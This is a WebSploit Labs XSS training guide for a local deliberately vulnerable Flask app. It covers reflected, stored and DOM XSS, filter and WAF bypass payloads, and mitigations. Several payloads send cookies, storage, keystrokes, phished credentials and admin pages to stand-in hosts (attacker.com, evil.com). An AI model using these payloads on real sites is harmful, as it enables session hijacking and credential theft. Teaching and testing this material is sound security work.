# XSS Playground: A WebSploit Labs Hacking Guide
*Created by Omar Santos for [WebSploit Labs](https://websploit.org/) - Cybersecurity Education*

[WebSploit Labs](https://websploit.org/) is a learning environment created by Omar Santos for different Cybersecurity Ethical Hacking, Bug Hunting, Incident Response, Digital Forensics, and Threat Hunting training sessions. WebSploit Labs includes several intentionally vulnerable applications running in Docker containers on top of Kali Linux or Parrot Security OS, several additional tools, and over 9,000 cybersecurity resources.

[WebSploit Labs](https://websploit.org/) has been used by many colleges and universities in different countries. 

WebSploit comes with a set of intentionally vulnerable applications running in Docker containers on top of Kali Linux or Parrot Security OS, several additional tools, and over 9,000 cybersecurity resources. Those containers were created in x86_64 architecture and can be run in any x86_64 Linux system. However, if you are using a macOS in Apple Silicon, you can complete this lab without the need of running the containers.

## 🎯 Learning Objectives
By completing this lab, students will learn to:
- Identify different types of XSS vulnerabilities (Reflected, Stored, DOM-based)
- Understand XSS attack vectors and contexts
- Exploit XSS vulnerabilities using various payloads
- Assess the impact of XSS attacks
- Implement proper XSS prevention techniques

## 📋 Prerequisites
- Basic understanding of HTML, JavaScript, and HTTP
- Familiarity with web browser developer tools
- Basic knowledge of web application security
- Burp Suite or similar web proxy (optional)

## 🚀 Lab Setup

### Install Dependencies
```bash
pip install -r requirements.txt
```

### Running the Application
```bash
# Save the application as xss_app.py
pip install flask
python3 xss_app.py
```

### Docker Setup (Recommended)
```dockerfile
FROM python:3.9-slim

WORKDIR /app
COPY xss_app.py .
RUN pip install flask

EXPOSE 5000
CMD ["python", "xss_app.py"]
```

```bash
# Build and run
docker build -t websploit-xss .
docker run -p 5000:5000 websploit-xss
```

## 🔍 Understanding XSS

**Cross-Site Scripting (XSS)** allows attackers to inject malicious scripts into web applications. XSS can lead to:
- Session hijacking and cookie theft
- Defacement and content manipulation
- Phishing attacks and credential theft
- Malware distribution
- Administrative access compromise

### XSS Types

1. **Reflected XSS**: Script executes immediately from user input
2. **Stored XSS**: Script persists in application data
3. **DOM XSS**: Script executes through client-side DOM manipulation

## 🧪 Testing Methodology

### Phase 1: Application Reconnaissance

#### 1.1 Map Application Endpoints
Navigate to `http://localhost:5000` and identify all input points:

- **Search Page** (`/search`) - Query parameter
- **Profile Page** (`/profile`) - User and bio parameters  
- **Comments** (`/comments`) - Comment form
- **Messages** (`/messages`) - DOM manipulation
- **Admin Panel** (`/admin`) - Session and debug parameters
- **Widget** (`/widget`) - Title, callback, and config parameters
- **API Endpoints** (`/api/search`, `/api/profile`) - JSON responses

#### 1.2 Identify Input Validation
Test each input point with benign data to understand:
- Input length limitations
- Character filtering
- Output encoding
- Content-Type responses

### Phase 2: Basic XSS Testing

#### 2.1 Simple Script Injection
Start with basic payloads to confirm XSS vulnerabilities:

```html
<!-- Basic alert payload -->
<script>alert('XSS')</script>

<!-- Alternative event handlers -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

#### 2.2 Context Detection
Understand where your input appears in the HTML:

```html
<!-- HTML context -->
<script>console.log('CONTEXT_TEST')</script>

<!-- Attribute context -->
" onmouseover="alert('XSS')" "

<!-- JavaScript context -->
'; alert('XSS'); //
```

### Phase 3: Reflected XSS Testing

#### 3.1 Search Functionality Testing
Test the search page at `/search?q=PAYLOAD`:

```bash
# Basic reflection test
http://localhost:5000/search?q=<script>alert('Reflected_XSS')</script>

# Event handler payload
http://localhost:5000/search?q=<img src=x onerror=alert('Search_XSS')>

# Multiple parameter test
http://localhost:5000/search?q=<script>alert('XSS')</script>&type=<script>alert('Type_XSS')</script>
```

#### 3.2 Profile Page Testing
Test the profile page at `/profile?user=PAYLOAD&bio=PAYLOAD`:

```bash
# Username parameter XSS
http://localhost:5000/profile?user=<script>alert('User_XSS')</script>

# Bio parameter XSS
http://localhost:5000/profile?bio=<img src=x onerror=alert('Bio_XSS')>

# Combined payload
http://localhost:5000/profile?user=admin&bio=<svg onload=alert('Profile_Compromised')>
```

#### 3.3 Admin Panel Testing
Test the admin panel with reflected XSS:

```bash
# Session parameter XSS
http://localhost:5000/admin?session=<script>alert('Admin_Session_XSS')</script>

# Debug parameter XSS
http://localhost:5000/admin?debug=<img src=x onerror=alert('Debug_XSS')>

# Combined admin compromise
http://localhost:5000/admin?session=admin123&debug=<script>document.body.style.background='red'</script>
```

### Phase 4: Stored XSS Testing

#### 4.1 Comment System Testing
Test persistent XSS through the comment system:

```html
<!-- Basic stored XSS -->
Name: <script>alert('Stored_XSS')</script>
Comment: This is a test comment

<!-- Event handler stored XSS -->
Name: TestUser
Comment: <img src=x onerror=alert('Stored_Comment_XSS')>

<!-- Advanced stored payload -->
Name: Admin
Comment: <svg onload=alert('Admin_Impersonation')>Click here for admin access</svg>
```

#### 4.2 Persistent Session Hijacking
Create payloads that steal session data:

```html
<!-- Cookie theft payload -->
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>

<!-- Local storage theft -->
<script>
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
  })
});
</script>
```

### Phase 5: DOM XSS Testing

#### 5.1 Message Center Testing
Test DOM manipulation vulnerabilities at `/messages`:

```html
<!-- URL fragment XSS -->
http://localhost:5000/messages#msg=<img src=x onerror=alert('DOM_XSS')>&to=victim

<!-- JavaScript injection through form -->
Recipient: <script>alert('DOM_Recipient')</script>
Message: <img src=x onerror=alert('DOM_Message')>
```

#### 5.2 JavaScript Context Testing
Test XSS within JavaScript execution contexts:

```javascript
// Break out of JavaScript string
'; alert('JS_Context_XSS'); //

// Function injection
Function('alert("Function_XSS")')()

// Event handler injection
onclick="alert('Event_XSS')"
```

### Phase 6: Context-Specific XSS

#### 6.1 Widget Testing
Test the widget endpoint with different contexts:

```bash
# JavaScript context XSS
http://localhost:5000/widget?title=Test&callback=alert('Callback_XSS')

# HTML attribute context
http://localhost:5000/widget?title=" onmouseover="alert('Title_XSS')" "

# JSON context
http://localhost:5000/widget?config={"test": "value", "xss": "<script>alert('JSON_XSS')</script>"}
```

#### 6.2 API Endpoint Testing
Test JSON API responses:

```bash
# Search API XSS
curl "http://localhost:5000/api/search?q=<script>alert('API_XSS')</script>"

# Profile API XSS
curl "http://localhost:5000/api/profile/testuser?bio=<img src=x onerror=alert('API_Profile_XSS')>"
```

## 🎯 Advanced XSS Techniques

### 7.1 Filter Bypass Techniques

#### Character Encoding
```html
<!-- URL encoding -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- HTML entities -->
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- Unicode encoding -->
<script>alert('\u0058\u0053\u0053')</script>
```

#### Alternative Event Handlers
```html
<!-- Mouse events -->
<div onmouseover="alert('XSS')">Hover me</div>

<!-- Keyboard events -->
<input onkeydown="alert('XSS')" autofocus>

<!-- Form events -->
<form onsubmit="alert('XSS')"><input type="submit"></form>

<!-- Media events -->
<audio src=x onerror="alert('XSS')">
<video src=x onerror="alert('XSS')">
```

#### JavaScript Alternatives
```html
<!-- JavaScript pseudo-protocol -->
<a href="javascript:alert('XSS')">Click me</a>

<!-- Data URI -->
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>

<!-- SVG JavaScript -->
<svg><script>alert('XSS')</script></svg>
```

### 7.2 WAF Bypass Techniques

#### Case Variation
```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
```

#### Whitespace and Comments
```html
<script /*comment*/>alert('XSS')</script>
<script
>alert('XSS')</script>
```

#### Tag Fragmentation
```html
<scr<script>ipt>alert('XSS')</script>
<img src="x" onerror="a=`aler`;b=`t`;c='XSS';(window[a+b])(c)">
```

## 🔧 Testing with Tools

### 8.1 Browser Developer Tools

#### Console Testing
```javascript
// Test in browser console
alert('XSS Test');
console.log(document.cookie);
document.body.innerHTML = '<h1>XSS Successful</h1>';
```

#### Network Tab Analysis
- Monitor XSS payload requests
- Check response headers
- Analyze Content-Security-Policy

### 8.2 Burp Suite Testing

#### Automated Scanning
1. Configure browser proxy to Burp
2. Navigate through application
3. Use Burp Scanner for XSS detection
4. Review findings in Scanner tab

#### Manual Testing with Repeater
1. Capture requests in Proxy
2. Send to Repeater
3. Modify parameters with XSS payloads
4. Analyze responses for successful execution

#### Intruder for Payload Testing
1. Position insertion points
2. Load XSS payload list
3. Configure attack type (Sniper/Battering Ram)
4. Launch attack and analyze results

### 8.3 Automated XSS Scanners

#### XSStrike
```bash
# Install XSStrike
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt

# Test specific endpoint
python xsstrike.py -u "http://localhost:5000/search?q=test"

# Crawl and test
python xsstrike.py -u "http://localhost:5000" --crawl
```

#### XSSer
```bash
# Install XSSer
pip install xsser

# Test endpoint
xsser -u "http://localhost:5000/search?q=XSS"
```

## 💥 Impact Demonstration

### 9.1 Cookie Theft
```html
<script>
// Steal cookies and send to attacker server
var cookies = document.cookie;
var img = new Image();
img.src = 'http://attacker.com/steal.php?cookies=' + encodeURIComponent(cookies);
</script>
```

### 9.2 Session Hijacking
```html
<script>
// Steal session storage
var sessionData = JSON.stringify(sessionStorage);
fetch('http://attacker.com/steal-session', {
  method: 'POST',
  body: sessionData
});
</script>
```

### 9.3 Keylogger Implementation
```html
<script>
// Simple keylogger
document.addEventListener('keypress', function(e) {
  var img = new Image();
  img.src = 'http://attacker.com/keylog.php?key=' + encodeURIComponent(e.key);
});
</script>
```

### 9.4 Phishing Attack
```html
<script>
// Replace page content with fake login form
document.body.innerHTML = `
  <div style="text-align:center; margin-top:100px;">
    <h2>Session Expired - Please Login Again</h2>
    <form action="http://attacker.com/phish.php" method="post">
      <input type="text" name="username" placeholder="Username" required><br><br>
      <input type="password" name="password" placeholder="Password" required><br><br>
      <input type="submit" value="Login">
    </form>
  </div>
`;
</script>
```

### 9.5 Admin Panel Access
```html
<script>
// Attempt to access admin functions
fetch('/admin', {
  method: 'GET',
  credentials: 'include'
}).then(response => response.text())
.then(data => {
  // Send admin page content to attacker
  fetch('http://attacker.com/admin-steal', {
    method: 'POST',
    body: data
  });
});
</script>
```

## 🎯 Specific Test Cases for Lab

### Test Case 1: Basic Reflected XSS
**Objective**: Confirm reflected XSS in search functionality

```bash
# Navigate to:
http://localhost:5000/search?q=<script>alert('Reflected_XSS_Found')</script>

# Expected Result: Alert popup appears
# Impact: Immediate script execution from URL parameter
```

### Test Case 2: Stored XSS Persistence
**Objective**: Demonstrate persistent XSS through comments

```html
<!-- Submit comment with payload: -->
Name: TestUser
Comment: <img src=x onerror=alert('Stored_XSS_Persistent')>

<!-- Expected Result: Alert appears for all users viewing comments -->
<!-- Impact: Affects all future visitors -->
```

### Test Case 3: DOM XSS via URL Fragment
**Objective**: Exploit client-side DOM manipulation

```bash
# Navigate to:
http://localhost:5000/messages#msg=<img src=x onerror=alert('DOM_XSS_Fragment')>&to=admin

# Expected Result: Alert popup from JavaScript processing
# Impact: Client-side execution without server involvement
```

### Test Case 4: Admin Panel Compromise
**Objective**: Target high-privilege functionality

```bash
# Navigate to:
http://localhost:5000/admin?debug=<script>alert('Admin_Compromised:'+document.cookie)</script>

# Expected Result: Alert showing admin session data
# Impact: Administrative access compromise
```

### Test Case 5: API XSS in JSON Response
**Objective**: Demonstrate XSS through API responses

```bash
# Test API endpoint:
curl "http://localhost:5000/api/search?q=<script>alert('API_XSS')</script>"

# Check if script appears in JSON response
# Impact: Affects applications consuming API data
```

## 🛡️ Detection and Mitigation

### 10.1 Detection Techniques

#### Web Application Firewalls (WAF)
- Monitor for XSS patterns in requests
- Block known malicious payloads
- Rate limiting for suspicious activity

#### Content Security Policy (CSP)
```html
<!-- Implement strict CSP -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; object-src 'none';">
```

#### Input Validation Logging
```python
import re
import logging

def detect_xss_attempt(input_data):
    xss_patterns = [
        r'<script.*?>.*?</script>',
        r'javascript:',
        r'on\w+\s*=',
        r'<iframe.*?>',
        r'<object.*?>'
    ]
    
    for pattern in xss_patterns:
        if re.search(pattern, input_data, re.IGNORECASE):
            logging.warning(f"XSS attempt detected: {input_data}")
            return True
    return False
```

### 10.2 Prevention Techniques

#### Input Sanitization
```python
import html
import re
from bleach import clean

def sanitize_input(user_input):
    # HTML encode special characters
    safe_input = html.escape(user_input)
    
    # Use bleach for HTML content
    allowed_tags = ['b', 'i', 'u', 'em', 'strong']
    safe_html = clean(user_input, tags=allowed_tags, strip=True)
    
    return safe_input
```

#### Output Encoding
```python
def safe_output(data, context='html'):
    if context == 'html':
        return html.escape(data)
    elif context == 'javascript':
        return json.dumps(data)
    elif context == 'url':
        return urllib.parse.quote(data)
    return data
```

#### Secure Template Usage
```python
from jinja2 import Environment, select_autoescape

# Configure Jinja2 with auto-escaping
env = Environment(autoescape=select_autoescape(['html', 'xml']))

# Use safe template rendering
template = env.from_string('<p>{{ user_input }}</p>')
safe_html = template.render(user_input=user_data)
```

### 10.3 Code Fix Examples

#### Before (Vulnerable)
```python
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f'<h1>Results for: {query}</h1>'  # XSS vulnerability
```

#### After (Secure)
```python
import html

@app.route('/search')
def search():
    query = request.args.get('q', '')
    safe_query = html.escape(query)  # Properly escaped
    return f'<h1>Results for: {safe_query}</h1>'
```

## 📊 Lab Report Template

### Executive Summary
- **Vulnerability Type**: Cross-Site Scripting (XSS)
- **Risk Level**: High
- **Affected Components**: [List vulnerable endpoints]
- **Business Impact**: [Describe potential damage]

### Technical Findings

#### Reflected XSS
- **Location**: `/search?q=PAYLOAD`
- **Payload**: `<script>alert('XSS')</script>`
- **Impact**: Immediate script execution

#### Stored XSS
- **Location**: Comment system
- **Payload**: `<img src=x onerror=alert('XSS')>`
- **Impact**: Persistent compromise affecting all users

#### DOM XSS
- **Location**: Message center URL fragment processing
- **Payload**: `#msg=<script>alert('XSS')</script>`
- **Impact**: Client-side execution bypass

### Proof of Concept
```html
<!-- Working exploit for comment system -->
Name: Attacker
Comment: <script>
  // Steal admin cookies
  if(document.cookie.includes('admin')) {
    document.location='http://evil.com/steal?'+document.cookie;
  }
</script>
```

### Risk Assessment
- **Confidentiality**: High - Session hijacking possible
- **Integrity**: High - Content manipulation possible  
- **Availability**: Medium - DoS through malicious scripts

### Remediation Recommendations
1. Implement input validation and output encoding
2. Deploy Content Security Policy (CSP)
3. Use parameterized queries and safe templates
4. Regular security testing and code review

## 🎓 Learning Questions

1. **Identification**: What are the key differences between Reflected, Stored, and DOM XSS?

2. **Exploitation**: How would you bypass common XSS filters?

3. **Context**: Why is understanding the injection context crucial for XSS exploitation?

4. **Impact**: What are the most severe potential impacts of XSS vulnerabilities?

5. **Prevention**: What defense-in-depth strategies prevent XSS attacks?

6. **Detection**: How can organizations detect XSS attacks in their applications?

### 📚 Additional Resources

- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [OWASP Top 10 Web Application Security Risks](https://owasp.org/Top10/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Generative AI Top 10](https://genai.owasp.org/)
- [OWASP AI Red Teaming & Evaluation](https://genai.owasp.org/initiatives/#ai-redteaming)
- [NIST Cybersecurity Framework](https://www.nist.gov/cybersecurity-framework)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security-academy)